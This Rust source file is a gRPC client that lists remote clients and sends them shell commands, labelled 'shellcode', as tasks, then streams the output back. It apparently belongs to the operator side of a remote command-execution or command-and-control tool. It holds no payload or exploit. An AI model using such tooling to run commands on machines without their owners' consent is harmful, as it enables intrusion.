use anyhow::Result;
use tokio::sync::mpsc::UnboundedSender;

use super::{
    Task,
    Message,
    common,
    iface::{
        interface_service_client::InterfaceServiceClient, AddTaskRequest, ClientListRequest,
        ConnectionRequest,
    },
};

use tonic::transport::Channel;

impl From<Task> for common::Task {
    fn from(value: Task) -> Self {
        Self {
            uuid: value.uuid.to_string(),
            shellcode: Some(common::ShellCode {
                command: value.code.0,
                arguments: value.code.1.unwrap_or_default(),
            })
        }
    }
}

pub struct Interface {
    client: InterfaceServiceClient<Channel>,
    uuid: String,
}

impl Interface {
    pub async fn connect(url: String) -> Result<Self> {
        let mut client = InterfaceServiceClient::connect(url).await?;
        let response = client
            .connection(tonic::Request::new(ConnectionRequest {}))
            .await?
            .into_inner();

        Ok(Self {
            client,
            uuid: response.uuid,
        })
    }

    pub async fn get_list(&mut self) -> Result<Vec<String>> {
        let response = self
            .client
            .get_list(tonic::Request::new(ClientListRequest {
                uuid: self.uuid.clone(),
            }))
            .await?
            .into_inner();

        Ok(response.list)
    }

    pub async fn add_task(&mut self, client_uuid: String, task: Task, tx: &UnboundedSender<Message>) -> Result<()> {
        let mut response = self.client
            .add_task(tonic::Request::new(AddTaskRequest {
                uuid: self.uuid.clone(),
                client_uuid,
                task: Some(task.into()),
            }))
            .await?.into_inner();

        while let Some(r) = response.message().await? {
            if let Some(line) = r.line {
                tx.send(Message::Output(line))?;
            }
        }

        Ok(())
    }
}
